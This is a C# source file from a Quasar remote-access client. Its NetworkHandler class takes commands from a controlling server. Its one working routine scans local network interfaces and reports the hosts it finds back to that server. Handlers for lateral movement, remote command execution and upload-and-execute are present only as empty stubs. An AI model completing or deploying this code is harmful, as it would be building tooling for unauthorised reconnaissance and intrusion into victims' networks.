using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.Helper;
using Quasar.Client.Helper.Network;
using Quasar.Common;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using Quasar.Common.Messages.other;
using Quasar.Common.Messages.Network;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class NetworkHandler : IMessageProcessor, IDisposable
    {
        private readonly QuasarClient _client;

        private readonly WebClient _webClient;

        public NetworkHandler(QuasarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient = new WebClient { Proxy = null };
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected)
            {
                if (_webClient.IsBusy)
                    _webClient.CancelAsync();
            }
        }

        public bool CanExecute(IMessage message) => message is DoNetworkScan ||
                                                    message is DoClientMovement ||
                                                    message is DoRemoteCommandExecute ||
                                                    message is DoUploadAndExecute;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoNetworkScan msg:
                    Execute(sender, msg);
                    break;
                case DoClientMovement msg:
                    Execute(sender, msg);
                    break;
                case DoRemoteCommandExecute msg:
                    Execute(sender, msg);
                    break;
                case DoUploadAndExecute msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoNetworkScan message)
        {
            MessageBox.Show("Scanning interfaces...");
            List<InterfaceEntity> interfaces = ScannerHelper.GetInterfaces();
            MessageBox.Show($"Found {interfaces.Count} interfaces!");
            Task.Run(() =>
            {
                foreach (InterfaceEntity nic in interfaces)
                {
                    MessageBox.Show($"Beginning scan on {nic.Name}");
                    ScannerHelper.ScanInterfaceAction(nic, (addressEntity, nicEntity) =>
                    {
                        _client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
                        MessageBox.Show($"Added new network entity: {addressEntity.Address}");
                    }, client);
                }
            });
        }

        private void Execute(ISender client, DoClientMovement message)
        {

        }

        private void Execute(ISender client, DoRemoteCommandExecute message)
        {

        }

        private void Execute(ISender client, DoUploadAndExecute message)
        {
             
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool deposing)
        {
            if (deposing)
            {
                _client.ClientState -= OnClientStateChange;
                _webClient.CancelAsync();
                _webClient.Dispose();
            }
        }
    }
}
